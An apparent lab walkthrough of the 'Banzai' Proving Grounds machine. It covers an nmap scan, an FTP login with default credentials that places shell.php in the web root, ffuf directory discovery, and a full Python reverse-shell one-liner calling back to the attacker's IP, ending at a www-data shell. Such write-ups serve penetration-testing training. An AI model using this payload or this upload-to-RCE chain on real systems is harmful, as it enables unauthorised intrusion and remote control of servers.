First start with nmap scan 

`nmap -sC -sV -T4 -oN nmap.txt <IP> -p- -Pn`

```
# Nmap 7.93 scan initiated Tue Dec 27 18:39:51 2022 as: nmap -sC -sV -T4 -oN fullmap.txt -Pn -p- 192.168.218.56
Nmap scan report for banzai.offseclabs.com (192.168.218.56)
Host is up (0.20s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT     STATE  SERVICE    VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp        vsftpd 3.0.3
22/tcp   open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 ba3f6815288636497b4a84226815ccd1 (RSA)
|   256 2dec3f7831c3d0345e3fe76b77b56109 (ECDSA)
|_  256 4f615cccb01fbeb4eb8f1c897104f0aa (ED25519)
25/tcp   open   smtp       Postfix smtpd
|_smtp-commands: banzai.offseclabs.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
|_ssl-date: TLS randomness does not represent time
5432/tcp open   postgresql PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.19
8080/tcp open   http       Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: 403 Forbidden
8295/tcp open   http       Apache httpd 2.4.25 ((Debian))
|_http-title: Banzai
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: Hosts:  banzai.offseclabs.com, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 27 18:52:32 2022 -- 1 IP address (1 host up) scanned in 761.19 seconds
```

Nice got some interesting ports open, first start by enumerating port 21.

![image](https://user-images.githubusercontent.com/87468669/209782893-a27f371b-1316-42fb-886a-458855b50f0b.png)

Tried loggin ftp with default creds like admin:admin and it worked, and i was able to put a file in the ftp directory, next let's enumerate port 8295 which is http service.

![image](https://user-images.githubusercontent.com/87468669/209783288-9829763c-4517-418d-85c2-e2424a66689b.png)

Checking page source was nothing sus in it, let's burst hidden dirs...

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/Banzai]
└─$ ffuf -u "http://192.168.108.56:8295/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 403 -fs 0,23315 -e .txt,.php,.bak,.zip,.js 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.108.56:8295/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .txt .php .bak .zip .js 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
 :: Filter           : Response size: 0,23315
________________________________________________

img                     [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 201ms]
css                     [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 1036ms]
lib                     [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 641ms]
js                      [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 191ms]
shell.php               [Status: 200, Size: 233, Words: 9, Lines: 12, Duration: 194ms]
contactform             [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 189ms]
```

Great as seen above the ftp server was connected to this web server's directory, we can see the shell file that was uploaded earlier.

![image](https://user-images.githubusercontent.com/87468669/209784201-bc5d2705-ea4f-4476-9cc9-2846af9424a5.png)

Checking the shell.php file i uploaded, i got an RCE, so let's get a reverse shell. Fire up ncat listener

![image](https://user-images.githubusercontent.com/87468669/209784622-9c7d56ac-d9fc-46be-b13c-3b4a65e18c2b.png)

reverse shell payload ready

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.108",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

![image](https://user-images.githubusercontent.com/87468669/209784859-bc6ce987-f54d-4f41-b3bc-75f077c3ecd7.png)

ran the reverse shell payload.

![image](https://user-images.githubusercontent.com/87468669/209784972-9680b912-e5e3-4416-a57b-b95f95b10889.png)

Boom I'm in got a reverse shell as user www-data.

![image](https://user-images.githubusercontent.com/87468669/209786068-eff48675-a09e-4efa-9002-70728d64814f.png)

stabilize the shell and esc privs...
